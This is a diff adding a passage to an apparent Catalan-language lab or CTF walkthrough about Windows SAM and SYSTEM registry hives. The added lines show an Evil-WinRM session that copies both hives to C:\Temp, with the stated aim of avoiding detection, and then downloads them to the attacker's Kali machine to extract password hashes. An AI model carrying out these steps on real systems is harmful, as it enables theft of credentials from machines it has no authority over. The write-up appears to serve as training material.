@@ -572,3 +572,41 @@ Els fitxers SAM i SYSTEM són fitxers de registre crítics de Windows que emmaga
 -El fitxer SAM és una base de dades que emmagatzema informació local del compte d'usuari, inclosos els hash de contrasenya per als usuaris de la màquina.
 
 -El fitxer SYSTEM conté informació relacionada amb la configuració del sistema, com ara la configuració del maquinari de la màquina i, el que és més important, les claus de xifratge utilitzades per protegir els hash de contrasenya emmagatzemats al fitxer SAM.
+
+Per evitar que Windows ens detecti, primer hem de moure'ns a la carpeta Temp, després hi guardarem una còpia dels fitxers SAM i SYSTEM. Anem a la C: amb cd C:\ i fem:
+```
+*Evil-WinRM* PS C:\> mkdir C:\Temp
+
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/21/2024   2:18 PM                Temp
+
+
+*Evil-WinRM* PS C:\> 
+*Evil-WinRM* PS C:\> reg save hklm\sam c:\Temp\sam
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\> 
+
+```
+
+Un cop fet això, descarreguem els fitxers a la nostra kali amb la comanda "download" de l'eina evil-winrm:
+```
+Evil-WinRM* PS C:\Temp> download sam
+                                        
+Info: Downloading C:\Temp\sam to sam
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Temp> download system
+                                        
+Info: Downloading C:\Temp\system to system
+Progress: 17% : |▒░░░░░░░░░|       
+```
